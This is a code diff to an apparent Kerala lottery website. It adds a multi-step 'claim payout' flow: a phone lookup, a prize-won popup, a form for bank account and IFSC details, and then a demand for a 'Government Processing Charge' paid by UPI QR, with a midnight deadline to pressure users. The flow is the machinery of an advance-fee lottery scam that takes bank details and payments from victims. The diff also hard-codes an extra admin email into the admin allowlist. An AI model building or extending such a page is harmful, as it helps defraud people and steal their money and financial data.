@@ -832,6 +832,19 @@
             .marquee-label { padding: 0 15px 0 10px; font-size: 12px; }
         }
 
+        /* Smooth CSS Marquee Animation */
+        @keyframes scroll-marquee-left {
+            0% { transform: translate3d(0, 0, 0); }
+            100% { transform: translate3d(-100%, 0, 0); }
+        }
+        .smooth-marquee {
+            display: inline-block;
+            white-space: nowrap;
+            padding-left: 100%;
+            will-change: transform;
+            animation: scroll-marquee-left 25s linear infinite;
+        }
+
         /* Helper Classes */
         .hidden { display: none; }
     </style>
@@ -1206,23 +1219,265 @@
 
     <!-- MODAL: TRACK ORDER -->
     <div class="modal-overlay" id="trackModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Track My Ticket</h3>
-                <span class="close-modal" onclick="closeModal('trackModal')">&times;</span>
+        <div class="modal-content" style="max-width: 545px; border-radius: 12px; overflow: hidden; padding: 0; border: 1px solid #cbd5e1; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);">
+            <div class="modal-header" style="background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); color:#fff; border-bottom: 2px solid var(--primary-gold); padding: 15px 20px; display:flex; justify-content:space-between; align-items:center;">
+                <h3 style="color: #fff; font-weight: 700; display:flex; align-items:center; gap:8px; margin:0; font-size:16px;">
+                    <i data-lucide="search" style="color: var(--primary-gold); width:18px; height:18px;"></i> Result Checker & Claim Payout
+                </h3>
+                <span class="close-modal" onclick="closeModal('trackModal')" style="color: #fff; cursor:pointer; font-size:24px; font-weight:bold; line-height: 1;">&times;</span>
             </div>
-            <div class="modal-body">
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label>Order ID / Mobile / UTR</label>
-                    <div style="display: flex; gap: 10px;">
-                        <input type="text" id="track-query" style="flex:1;" placeholder="Enter details...">
-                        <button class="btn-gold" onclick="trackOrder()">Track</button>
+            
+            <!-- REGULAR CHECKER MARQUEE WARNING BANNER -->
+            <div style="background: #fef2f2; border-bottom: 1.5px solid #fecaca; color: #991b1b; font-size: 11px; font-weight: 800; padding: 6px 0; overflow: hidden; white-space: nowrap; font-family: var(--font-sans); display: flex; width: 100%;">
+                <div class="smooth-marquee">
+                    ⚠️ IMPORTANT NOTICE: Payment claim raat 12 bje se pehle karna rahega warna payment nhi hogi iske zimmedar company nhi hogi. Apna result regular check kre! (दावा राशि का भुगतान रात 12 बजे से पहले करना आवश्यक है, अन्यथा भुगतान अमान्य होगा। इसकी जिम्मेदारी कंपनी की नहीं होगी। कृपया नियमित रूप से अपना परिणाम जांचें।)
+                </div>
+            </div>
+            
+            <div class="modal-body" style="padding: 24px; max-height:85vh; overflow-y:auto; background:#fff;">
+                
+                <!-- STEP 1: ENTER PHONE NUMBER -->
+                <div id="check-step-phone">
+                    <h4 style="font-family: var(--heading-font); color:#0f172a; font-weight:700; margin-bottom:10px; font-size:15px;">Verify Mobile Number</h4>
+                    <p style="font-size:13px; color:#64748b; margin-bottom:20px; line-height:1.5;">Enter your registered mobile number to proceed with ticket checking and instant claimant verification. (अपना रजिस्टर्ड मोबाइल नंबर दर्ज करें।)</p>
+                    
+                    <!-- WELCOME EXISED USER HIGHLIGHT -->
+                    <div id="checker-existed-welcome" class="hidden" style="background: #ecfdf5; border: 1px solid #10b981; border-radius: 8px; padding: 10px 15px; margin-bottom: 20px; text-align: left;">
+                        <span style="font-size: 11px; font-weight: 700; text-transform: uppercase; color: #047857; display: block; letter-spacing: 0.5px;">Existing Customer Found</span>
+                        <span style="font-size: 14px; font-weight: 800; color: #065f46;" id="checker-existed-name">Hello, {Name}</span>
+                    </div>
+
+                    <div class="form-group" style="margin-bottom: 20px;">
+                        <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:5px; display:block;">Phone Number (मोबाइल नंबर)</label>
+                        <input type="text" id="checker-phone" placeholder="Enter 10-Digit Mobile Number" maxlength="10" style="width: 100%; padding: 12px; border: 1.5px solid #cbd5e1; border-radius: 6px; font-size:14px; font-weight:600; color:#1e293b;" oninput="handlePhoneInputChecker()">
+                        <span id="checker-phone-error" style="display:none; color:#ef4444; font-size:12px; font-weight:600; margin-top:5px;">Please check number. (कृपया मोबाइल नंबर जांचें। कोई ऑर्डर नहीं मिला।)</span>
+                    </div>
+
+                    <!-- DATE SELECTOR (HIDDEN BY DEFAULT, SHOWN FOR EXISTED CUSTOMERS) -->
+                    <div id="checker-date-selector-container" class="hidden" style="margin-bottom: 20px; text-align: left; background: #fffbeb; border: 1px solid #fef3c7; border-radius: 8px; padding: 12px 15px;">
+                        <label style="font-size:11.5px; font-weight:700; color:#b45309; text-transform:uppercase; margin-bottom:6px; display:block;">Which Date's Result Do You Want to See? (आप किस तारीख का रिजल्ट देखना चाहते हैं?)</label>
+                        <input type="date" id="checker-query-date" style="width: 100%; padding: 10px; border: 1.5px solid #f59e0b; border-radius: 6px; font-size:13.5px; font-weight:700; color:#78350f; background:#fff;">
+                        <p style="font-size: 11px; color: #d97706; margin-top: 4px; font-weight: 500;">Select drawing date to filter results. (परिणाम छानने के लिए ड्रॉ की तारीख चुनें।)</p>
+                    </div>
+
+                    <button class="btn-gold" id="checker-phone-btn" style="width: 100%; padding: 12px; font-weight:700; font-size:14px;" onclick="checkerNextToTickets()">Proceed (आगे बढ़ें)</button>
+                </div>
+                
+                <!-- STEP 2: REGISTERED CUSTOMER TICKETS DISPLAY -->
+                <div id="check-step-tickets" class="hidden">
+                    <button style="border:none; background:none; color:#64748b; font-size:12px; cursor:pointer; font-weight:600; margin-bottom:15px; display:flex; align-items:center; gap:4px; padding:0;" onclick="checkerBackToPhone()">
+                        <i data-lucide="arrow-left" style="width:14px; height:14px;"></i> Back to Mobile
+                    </button>
+                    <div style="background:#f0faf6; padding:12px 18px; border-radius:8px; border:1px solid #bbf7d0; margin-bottom:20px;">
+                        <span style="font-size:14.5px; color:#15803d; font-weight:800; display:block; margin-bottom:4px;" id="checker-welcome-message">Welcome, Client Name!</span>
+                        <span style="font-size:12px; color:#475569; font-weight:600;">Reg. Phone: <span id="checker-display-phone" style="color:#0f172a; font-weight:700;"></span></span>
+                    </div>
+                    
+                    <h4 style="font-family: var(--heading-font); color:#0f172a; font-weight:700; margin-bottom:5px; font-size:15px;">Your Booked Tickets (आपके बुक किए गए टिकट)</h4>
+                    <p style="font-size:12px; color:#64748b; margin-bottom:15px;">The following tickets are registered to your account. (आपके अकाउंट में निम्नलिखित टिकटें दर्ज हैं:)</p>
+                    
+                    <div id="checker-registered-tickets" style="display:flex; flex-wrap:wrap; gap:8px; margin-bottom:25px; padding: 12px; background:#f8fafc; border-radius:6px; border:1px solid #cbd5e1; min-height: 50px; align-items: center;">
+                        <!-- Automatically populated ticket list tags -->
+                    </div>
+                    
+                    <button class="btn-gold" style="width: 100%; padding: 14px; font-weight:800; font-size:14px; display:flex; align-items:center; justify-content:center; gap:6px;" onclick="checkerSubmitCheck()">
+                        Check Live Draw Results (रिजल्ट चेक करें) <i data-lucide="search" style="width:16px;"></i>
+                    </button>
+                </div>
+
+                <!-- STEP 3: RESULTS GRID CHART -->
+                <div id="check-step-results" class="hidden">
+                    <button style="border:none; background:none; color:#64748b; font-size:12px; cursor:pointer; font-weight:600; margin-bottom:15px; display:flex; align-items:center; gap:4px; padding:0;" onclick="checkerBackToTickets()">
+                        <i data-lucide="arrow-left" style="width:14px; height:14px;"></i> Back to Ticket Entry
+                    </button>
+                    
+                    <h4 style="font-family: var(--heading-font); color:#0f172a; font-weight:700; margin-bottom:12px; font-size:15px;">Draw Result Grid Analysis (चेकर विवरण)</h4>
+                    
+                    <div class="admin-table-container" style="border:1px solid #cbd5e1; border-radius:8px; overflow-x:auto; -webkit-overflow-scrolling:touch; margin-bottom:20px;">
+                        <table style="width:100%; min-width:480px; border-collapse:collapse; text-align:left; font-size:13px;">
+                            <thead style="background:#f1f5f9; font-weight:700; color:#334155; border-bottom:1px solid #cbd5e1;">
+                                <tr>
+                                    <th style="padding:10px 12px;">Ticket Number</th>
+                                    <th style="padding:10px 12px;">Tier</th>
+                                    <th style="padding:10px 12px;">Result</th>
+                                    <th style="padding:10px 12px; text-align:right;">Winnings</th>
+                                </tr>
+                            </thead>
+                            <tbody id="checker-results-grid-rows">
+                                <!-- Dynamic rows -->
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div style="background:#fefce8; border:1.5px dashed #facc15; border-radius:10px; padding:15px 20px; text-align:center; margin-bottom:25px;">
+                        <span style="font-size:11px; font-weight:700; color:#854d0e; text-transform:uppercase; letter-spacing:0.5px; display:block;">TOTAL ACCUMULATED WINNINGS (कुल इनाम)</span>
+                        <div style="font-size:28px; font-weight:900; color:#b91c1c; font-family:var(--heading-font);" id="checker-display-total-winnings">₹0</div>
+                    </div>
+                    
+                    <div id="checker-results-action">
+                        <!-- Dynamic Button (Claim or Back) -->
                     </div>
                 </div>
-                <div id="track-result" class="hidden">
-                    <!-- Tracking details here -->
+
+                <!-- STEP 4: CLAIM BANK FORM -->
+                <div id="check-step-bank" class="hidden">
+                    <button style="border:none; background:none; color:#64748b; font-size:12px; cursor:pointer; font-weight:600; margin-bottom:15px; display:flex; align-items:center; gap:4px; padding:0;" onclick="checkerBackToResults()">
+                        <i data-lucide="arrow-left" style="width:14px; height:14px;"></i> Back to Results
+                    </button>
+                    
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:20px; border-bottom:1.5px solid #f1f5f9; padding-bottom:10px;">
+                        <span style="background:var(--primary-gold); color:#fff; width:22px; height:22px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-size:11px; font-weight:700;">1</span>
+                        <h4 style="font-size:15px; font-weight:700; color:#1e293b; margin:0;">Enter Payout Bank Details (बैंक खाता विवरण भरें)</h4>
+                    </div>
+                    
+                    <div style="display:flex; flex-direction:column; gap:14px; margin-bottom:25px;">
+                        <div class="form-group">
+                            <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:4px; display:block;">Accountholder Name (खाताधारक का नाम)</label>
+                            <input type="text" id="checker-bank-name" placeholder="Full Name as per bank records" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; color:#1e293b;">
+                        </div>
+                        <div class="form-group">
+                            <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:4px; display:block;">Bank Name (बैंक का नाम)</label>
+                            <input type="text" id="checker-bank-bankname" placeholder="e.g. State Bank of India" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; color:#1e293b;">
+                        </div>
+                        <div class="form-group">
+                            <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:4px; display:block;">Bank Account Number (बैंक खाता संख्या)</label>
+                            <input type="text" id="checker-bank-acc" placeholder="Enter Bank Account Number" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; color:#1e293b;">
+                        </div>
+                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px;">
+                            <div class="form-group">
+                                <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:4px; display:block;">IFSC Code (आईएफएससी)</label>
+                                <input type="text" id="checker-bank-ifsc" placeholder="e.g. SBIN0001234" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; text-transform:uppercase; color:#1e293b;">
+                            </div>
+                            <div class="form-group">
+                                <label style="font-size:11px; font-weight:700; color:#475569; text-transform:uppercase; margin-bottom:4px; display:block;">Branch Name (शाखा का नाम)</label>
+                                <input type="text" id="checker-bank-branch" placeholder="e.g. Vikas Bhavan Branch" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; color:#1e293b;">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-gold" style="width: 100%; padding: 12px; font-weight:700; font-size:14px;" onclick="checkerSubmitBankForm()">Proceed (आगे बढ़ें)</button>
                 </div>
+
+                <!-- STEP 5: FEES AND QR PROOF -->
+                <div id="check-step-qr" class="hidden">
+                    <button style="border:none; background:none; color:#64748b; font-size:12px; cursor:pointer; font-weight:600; margin-bottom:15px; display:flex; align-items:center; gap:4px; padding:0;" onclick="checkerBackToBank()">
+                        <i data-lucide="arrow-left" style="width:14px; height:14px;"></i> Back to Bank Details
+                    </button>
+                    
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; border-bottom:1.5px solid #f1f5f9; padding-bottom:10px;">
+                        <span style="background:var(--primary-gold); color:#fff; width:22px; height:22px; display:flex; align-items:center; justify-content:center; border-radius:50%; font-size:11px; font-weight:700;">2</span>
+                        <h4 style="font-size:15px; font-weight:700; color:#1e293b; margin:0; font-size:15px;">Government Processing Charge</h4>
+                    </div>
+                    
+                    <!-- Dynamic Fee Calculation display -->
+                    <div style="background:#fefce8; border:1px solid #fde68a; border-radius:8px; padding:15px; margin-bottom:20px; text-align:center;">
+                        <span style="font-size:11px; font-weight:700; color:#854d0e; display:block; margin-bottom:2px;">GOVERNMENT PROCESS SECURE VERIFICATION FEE</span>
+                        <div style="font-size:26px; font-weight:900; color:#b91c1c;" id="checker-fee-amount">₹0</div>
+                        <p style="font-size:11px; color:#78350f; margin-top:5px; line-height:1.4; font-weight: 500;" id="checker-fee-description">
+                            Calculating...
+                        </p>
+                    </div>
+                    
+                    <!-- UPI QR Payment -->
+                    <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; background:#f8fafc; border:1px solid #e2e8f0; padding:15px; border-radius:8px; margin-bottom:20px;">
+                        <p style="font-size:11.5px; color:#475569; font-weight:600; margin-bottom:10px; text-align:center;">Scan with GPay, PhonePe, Paytm or UPI App</p>
+                        <div style="width:160px; height:160px; background:#fff; padding:8px; border-radius:6px; border:1px solid #cbd5e1; display:flex; align-items:center; justify-content:center; margin-bottom:10px;">
+                            <img id="checker-qr-image" style="max-width:100%; max-height:100%; display:block;" src="" alt="Kerala Government Secure QR Payout Fee">
+                        </div>
+                        <div style="text-align:center; width:100%;">
+                            <div style="font-size:12px; font-weight:700; color:#334155; word-wrap:break-word;" id="checker-upi-text">lottery@okhdfcbank</div>
+                            <button onclick="checkerCopyUPI()" style="background:#fff; border:1px solid #cbd5e1; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer; margin-top:5px; display:inline-flex; align-items:center; gap:4px;">
+                                <i data-lucide="copy" style="width:12px; height:12px;"></i> Copy UPI ID
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Proof Inputs -->
+                    <div style="display:flex; flex-direction:column; gap:12px; margin-bottom:20px;">
+                        <div class="form-group">
+                            <label style="font-size:11px; font-weight:700; color:#1e293b; text-transform:uppercase; margin-bottom:4px; display:block;">UTR / Transaction ID <span style="color:#b91c1c;">*</span></label>
+                            <input type="text" id="checker-utr" placeholder="Enter 12-digit UPI UTR number" style="width: 100%; padding: 10px; border:1.5px solid #cbd5e1; border-radius:6px; font-size:13px; color:#1e293b;">
+                        </div>
+                        <div class="form-group">
+                            <label style="font-size:11px; font-weight:700; color:#1e293b; text-transform:uppercase; margin-bottom:4px; display:block;">Payment Screenshot Proof <span style="color:#b91c1c;">*</span></label>
+                            <input type="file" id="checker-ss" accept="image/*" style="font-size: 12px; width:100%;" onchange="checkerPreviewSS()">
+                            <div id="checker-ss-preview" style="margin-top: 8px;"></div>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-gold" style="width: 100%; padding: 12px; font-weight:700; font-size:14px;" onclick="checkerSubmitFinalClaim()">Submit Claim Payout Verification (दावा सबमिट करें)</button>
+                </div>
+                
+                <!-- STEP 6: CLAIM SUCCESS -->
+                <div id="check-step-success" class="hidden" style="text-align:center; padding:15px 0;">
+                    <div style="font-size:55px; line-height:1; margin-bottom:15px; animation: bounce 2s infinite;">🎉</div>
+                    <h3 style="font-family: var(--heading-font); color:#16a34a; font-weight:800; font-size:22px; margin-bottom:8px;">Claim Request Submitted!</h3>
+                    <h5 style="color:#0f172a; font-size:13px; font-weight:700; margin-bottom:15px;">आपका दावा सफलतापूर्वक सबमिट हो गया है!</h5>
+                    
+                    <p style="font-size:13px; color:#475569; line-height:1.6; margin-bottom:20px;">
+                        Your Bank Payout details and secure Verification Charge of <b id="checker-success-fee">₹0</b> with Transaction ID/UTR <b id="checker-success-utr"></b> have been registered for clearance successfully. 
+                        Our Accounts Department and Government Auditors will verify and credit <b id="checker-success-winnings">₹0</b> directly to your bank account within 24 hours.
+                    </p>
+                    
+                    <div style="display:flex; flex-direction:column; gap:10px;">
+                        <button class="btn-gold" style="width:100%; padding:12px; font-weight:700;" onclick="resetTrackerFlow()">Check Another Number (दूसरा नंबर चेक करें)</button>
+                        <button class="btn-gold" style="width:100%; padding:12px; font-weight:700; background:#475569; color:#fff;" onclick="closeModal('trackModal')">Back to Home (होम पर जाएं)</button>
+                    </div>
+                </div>
+
             </div>
+        </div>
+    </div>
+
+    <!-- MODAL: CONGRATULATIONS AND CLAIM START -->
+    <div id="checker-congrats-modal" class="modal-overlay" style="display:none; z-index: 10000; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(4px); align-items:center; justify-content:center; position:fixed; top:0; left:0; right:0; bottom:0;">
+        <div class="modal-content" style="max-width:480px; text-align:center; padding:35px 25px; border:2px solid var(--primary-gold); background: #fff; border-radius:16px; box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.3); animation: scaleUp 0.3s ease-out; position:relative;">
+            
+            <div style="font-size:65px; line-height:1; margin-bottom:15px; animation: pulse 1.5s infinite;">🏆</div>
+            
+            <h2 style="font-family: var(--heading-font); font-weight:900; color:#b91c1c; font-size:26px; margin: 0 0 5px;" id="congrats-title-text">Congratulations!</h2>
+            <h4 style="font-size:14px; font-weight:700; color:#0f172a; margin-bottom:15px;" id="congrats-hindi-text">बधाई हो!</h4>
+            
+            <p style="font-size:14px; color:#475569; margin-bottom:18px; line-height:1.5;">
+                You have won a lottery prize worth! <br>
+                (आपने लॉटरी में बम्पर इनाम जीता है!)
+            </p>
+            
+            <div style="background: linear-gradient(135deg, #fef08a 0%, #fef9c3 100%); border:2px solid #facc15; border-radius:12px; padding:15px; margin-bottom:25px; box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);">
+                <span style="font-size:11px; font-weight:800; color:#854d0e; letter-spacing:1px; text-transform:uppercase; display:block; margin-bottom:2px;">TOTAL WINNING AMOUNT (कुल विजेता राशि)</span>
+                <span id="congrats-prize-amount" style="font-size:36px; font-weight:950; color:#b91c1c; font-family:var(--heading-font); text-shadow:1px 1px 0px rgba(255,255,255,0.8);">₹0</span>
+            </div>
+            
+            <button class="btn-gold" style="width:100%; padding:14px; font-size:15px; font-weight:800; display:flex; align-items:center; justify-content:center; gap:8px;" onclick="closeCongratsAndProceedToBank()">
+                CLAIM WINNINGS (दावा करें) <i data-lucide="arrow-right" style="width:18px; height:18px;"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- SUCCESS PROCESS POPUP (आपका भुगतान 72 घन्टे के भीतर स्वीकृत कर दिया जायेगा) -->
+    <div id="checker-payout-success-modal" class="modal-overlay" style="display:none; z-index: 10005; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(4px); align-items:center; justify-content:center; position:fixed; top:0; left:0; right:0; bottom:0;">
+        <div class="modal-content" style="max-width:460px; text-align:center; padding:35px 25px; border:2px solid #22c55e; background: #fff; border-radius:16px; box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.3);">
+            
+            <div style="font-size:60px; line-height:1; margin-bottom:15px; animation: bounce 2s infinite;">✅</div>
+            
+            <h2 style="font-family: var(--heading-font); font-weight:800; color:#15803d; font-size:22px; margin: 0 0 10px;">Claim Submitted Successfully!</h2>
+            
+            <div style="background:#f0fdf4; border:1px solid #bbf7d0; padding:18px; border-radius:10px; margin-bottom:20px; text-align:left;">
+                <p style="font-size:14px; color:#15803d; font-weight:700; margin:0 0 8px; line-height:1.4;">
+                    Your payment will be approved within 72 hours. If your fee payment is incorrect, our team will WhatsApp you.
+                </p>
+                <p style="font-size:13px; color:#166534; font-weight:700; margin:0; line-height:1.4; border-top:1.5px dashed #bbf7d0; padding-top:8px;">
+                    आपका पेमेंट 72 घंटे के भीतर स्वीकृत कर दिया जाएगा। यदि आपका भुगतान गलत पाया गया, तो हमारी टीम आपसे व्हाट्सएप पर संपर्क करेगी।
+                </p>
+            </div>
+            
+            <div style="font-size:12px; color:#64748b; margin-bottom:20px;">
+                Transaction Ref: <span id="success-popup-ref" style="font-weight:700; color:#0f172a;">N/A</span>
+            </div>
+            
+            <button class="btn-gold" style="width:100%; padding:12px; font-weight:700; background:#22c55e; border:none; color:#fff;" onclick="closeAllClaimModals()">
+                OK (ठीक है)
+            </button>
         </div>
     </div>
 
@@ -1853,7 +2108,7 @@
                 onAuthStateChanged(auth, async (user) => {
                     if (user) {
                         try {
-                            const targetAdmins = ["admin@kerala.com", "khanazlan997@gmail.com"];
+                            const targetAdmins = ["admin@kerala.com", "khanazlan997@gmail.com", "publicadsnetwork@gmail.com"];
                             const authorizedEmails = getLocalTable("authorized_emails");
                             let authDoc = authorizedEmails.find(x => x.email === user.email);
                             
@@ -2038,11 +2293,17 @@
             document.body.style.overflow = 'hidden';
             $('dropdownMenu').classList.remove('active');
             if(id === 'resultModal') renderResultModal();
+            if(id === 'trackModal' && typeof window.resetTrackerFlow === 'function') {
+                window.resetTrackerFlow();
+            }
         };
 
         window.closeModal = (id) => {
             $(id).classList.remove('active');
             document.body.style.overflow = 'auto';
+            if(id === 'trackModal' && typeof window.resetTrackerFlow === 'function') {
+                window.resetTrackerFlow();
+            }
         };
 
         window.customConfirm = (message, confirmBtnText = "Delete") => {
@@ -2242,7 +2503,660 @@
             }
         };
 
-        window.trackOrder = async () => {
+        // --- TICKETS RESULTS CHECKER & CLAIM FLOW ---
+        function hasAlreadyClaimed(phone) {
+            if (!phone) return false;
+            const cleanPhone = String(phone).trim();
+            let grievances = [];
+            try {
+                const localGrive = localStorage.getItem('local_db_grievances');
+                if (localGrive) grievances = JSON.parse(localGrive);
+            } catch(e) {
+                console.warn("Direct claim checker parse error:", e);
+            }
+            if (!Array.isArray(grievances) || grievances.length === 0) {
+                try {
+                    grievances = getLocalTable("grievances") || [];
+                } catch(e) {}
+            }
+            return grievances.some(g => String(g.phone).trim() === cleanPhone && g.isWinnerClaim === true);
+        }
+        window.hasAlreadyClaimed = hasAlreadyClaimed;
+
+        window.resetTrackerFlow = () => {
+            // Show step 1, hide others
+            $('check-step-phone').classList.remove('hidden');
+            $('check-step-tickets').classList.add('hidden');
+            $('check-step-results').classList.add('hidden');
+            $('check-step-bank').classList.add('hidden');
+            $('check-step-qr').classList.add('hidden');
+            $('check-step-success').classList.add('hidden');
+
+            $('checker-phone').value = '';
+            $('checker-display-phone').innerText = '';
+            if ($('checker-phone-error')) $('checker-phone-error').style.display = 'none';
+
+            // Welcome back and Date inputs reset
+            if ($('checker-existed-welcome')) $('checker-existed-welcome').classList.add('hidden');
+            if ($('checker-date-selector-container')) $('checker-date-selector-container').classList.add('hidden');
+            if ($('checker-phone-btn')) $('checker-phone-btn').innerText = "Proceed (आगे बढ़ें)";
+            if ($('checker-query-date')) $('checker-query-date').value = '';
+            window.checkerExistedCustomer = false;
+            window.checkerSelectedDate = null;
+            
+            window.trackerPhoneNumber = '';
+            window.trackerClientName = '';
+            window.trackerTickets = [];
+            window.trackerWinningTickets = [];
+            window.trackerWinningAmount = 0;
+        };
+
+        window.handlePhoneInputChecker = async () => {
+            const phone = $('checker-phone').value.trim();
+            if (phone.length === 10 && !isNaN(Number(phone))) {
+                let localOrders = [];
+                try {
+                    localOrders = getLocalTable("lottery_orders") || [];
+                } catch (e) {}
+                const matched = localOrders.find(o => String(o.phone).trim() === phone && o.status !== "Rejected");
+                if (matched) {
+                    window.checkerExistedCustomer = true;
+                    if ($('checker-existed-name')) $('checker-existed-name').innerText = `Hello, ${matched.name || 'Customer'}`;
+                    if ($('checker-existed-welcome')) $('checker-existed-welcome').classList.remove('hidden');
+                    if ($('checker-date-selector-container')) $('checker-date-selector-container').classList.remove('hidden');
+                    if ($('checker-phone-btn')) $('checker-phone-btn').innerText = "Check My Tickets (आगे बढ़ें)";
+                } else {
+                    if (db) {
+                        try {
+                            const qPhone = query(collection(db, "lottery_orders"), where("phone", "==", phone));
+                            const snapPhone = await getDocs(qPhone);
+                            if (!snapPhone.empty) {
+                                const docs = snapPhone.docs.map(d => ({id: d.id, ...d.data()}));
+                                const firstMatched = docs.find(o => o.status !== "Rejected");
+                                if (firstMatched) {
+                                    syncToLocalTable("lottery_orders", firstMatched);
+                                    window.checkerExistedCustomer = true;
+                                    if ($('checker-existed-name')) $('checker-existed-name').innerText = `Hello, ${firstMatched.name || 'Customer'}`;
+                                    if ($('checker-existed-welcome')) $('checker-existed-welcome').classList.remove('hidden');
+                                    if ($('checker-date-selector-container')) $('checker-date-selector-container').classList.remove('hidden');
+                                    if ($('checker-phone-btn')) $('checker-phone-btn').innerText = "Check My Tickets (आगे बढ़ें)";
+                                    return;
+                                }
+                            }
+                        } catch(e) {
+                            console.warn("Direct phone check query error:", e);
+                        }
+                    }
+                    window.checkerExistedCustomer = false;
+                    if ($('checker-existed-welcome')) $('checker-existed-welcome').classList.add('hidden');
+                    if ($('checker-date-selector-container')) $('checker-date-selector-container').classList.add('hidden');
+                    if ($('checker-phone-btn')) $('checker-phone-btn').innerText = "Proceed (आगे बढ़ें)";
+                }
+            } else {
+                window.checkerExistedCustomer = false;
+                if ($('checker-existed-welcome')) $('checker-existed-welcome').classList.add('hidden');
+                if ($('checker-date-selector-container')) $('checker-date-selector-container').classList.add('hidden');
+                if ($('checker-phone-btn')) $('checker-phone-btn').innerText = "Proceed (आगे बढ़ें)";
+            }
+        };
+
+        window.checkerNextToTickets = async () => {
+            const phone = $('checker-phone').value.trim();
+            if (phone.length !== 10 || isNaN(Number(phone))) {
+                showToast("Please enter a valid 10-digit mobile number.", "error");
+                return;
+            }
+            
+            showToast("Searching your tickets... (टिकटें खोजी जा रही हैं...)", "info");
+            
+            // Determine selected date right away so we can filter tickets matching that date
+            if (window.checkerExistedCustomer && $('checker-query-date')) {
+                window.checkerSelectedDate = $('checker-query-date').value;
+            } else {
+                window.checkerSelectedDate = null;
+            }
+            
+            let matchedOrders = [];
+            
+            // 1. Search local cached orders first
+            try {
+                const localOrders = getLocalTable("lottery_orders") || [];
+                matchedOrders = localOrders.filter(o => String(o.phone).trim() === phone && o.status !== "Rejected");
+            } catch (err) {
+                console.warn("Error looking up local orders:", err);
+            }
+            
+            // 2. Direct Firestore fallback query if needed
+            if (db && matchedOrders.length === 0) {
+                try {
+                    const qPhone = query(collection(db, "lottery_orders"), where("phone", "==", phone));
+                    const snapPhone = await getDocs(qPhone);
+                    if (!snapPhone.empty) {
+                        snapPhone.docs.forEach(d => {
+                            const item = { id: d.id, ...d.data() };
+                            syncToLocalTable("lottery_orders", item);
+                            if (item.status !== "Rejected" && !matchedOrders.some(m => m.id === item.id)) {
+                                matchedOrders.push(item);
+                            }
+                        });
+                    }
+                } catch (e) {
+                    console.warn("Direct Cloud phone check lookup error:", e);
+                }
+            }
+            
+            if (matchedOrders.length === 0) {
+                showToast("Please check number. No bookings found! (कृपया मोबाइल नंबर सही दर्ज करें, कोई टिकट नहीं मिला।)", "error");
+                const inlineErr = $('checker-phone-error');
+                if (inlineErr) {
+                    inlineErr.innerText = "Please check number. (कृपया मोबाइल नंबर जांचें। कोई ऑर्डर नहीं मिला।)";
+                    inlineErr.style.display = "block";
+                }
+                return;
+            }
+            
+            // Clear error msg
+            const inlineErr = $('checker-phone-error');
+            if (inlineErr) inlineErr.style.display = "none";
+            
+            const clientName = matchedOrders[0].name || "Customer";
+            window.trackerPhoneNumber = phone;
+            window.trackerClientName = clientName;
+            
+            // Extract all unique booked tickets across non-rejected bookings, matching selected date if active
+            const allTickets = [];
+            const filteredOrders = window.checkerSelectedDate
+                ? matchedOrders.filter(o => {
+                    const orderDate = o.date || (o.timestamp ? o.timestamp.substring(0, 10) : "");
+                    return orderDate === window.checkerSelectedDate;
+                  })
+                : matchedOrders;
+
+            filteredOrders.forEach(o => {
+                const list = o.ticketsList || (o.tickets ? o.tickets.split(',').map(t => t.trim()) : []);
+                list.forEach(tk => {
+                    if (tk) allTickets.push(tk.toUpperCase().trim());
+                });
+            });
+            const uniqueTickets = Array.from(new Set(allTickets));
+            window.trackerTickets = uniqueTickets;
+            
+            // Populate Welcome layout & tickets tag block
+            if ($('checker-welcome-message')) {
+                $('checker-welcome-message').innerText = `Welcome, ${clientName}! (स्वागत है, ${clientName}!)`;
+            }
+            $('checker-display-phone').innerText = phone;
+            
+            const tagsContainer = $('checker-registered-tickets');
+            if (tagsContainer) {
+                if (uniqueTickets.length === 0) {
+                    const selectedDateWarning = window.checkerSelectedDate ? ` for selected date ${window.checkerSelectedDate}` : "";
+                    tagsContainer.innerHTML = `<span style="font-size: 13px; color: #ef4444; font-weight:700; width:100%; text-align:center;">No active tickets registered to this phone number${selectedDateWarning}.</span>`;
+                } else {
+                    tagsContainer.innerHTML = uniqueTickets.map(t => {
+                        const styleColor = t.startsWith("KL") ? '#1d4ed8' : t.startsWith("SL") ? '#db2777' : '#16a34a';
+                        const styleBg = t.startsWith("KL") ? '#eff6ff' : t.startsWith("SL") ? '#fdf2f8' : '#f0fdf4';
+                        return `<span style="background: ${styleBg}; border: 1.5px solid ${styleColor}; color: ${styleColor}; padding: 6px 12px; border-radius: 6px; font-size: 13px; font-family: var(--accent-font); font-weight: 800; display:inline-block; margin: 4px;">${t}</span>`;
+                    }).join('');
+                }
+            }
+
+            $('check-step-phone').classList.add('hidden');
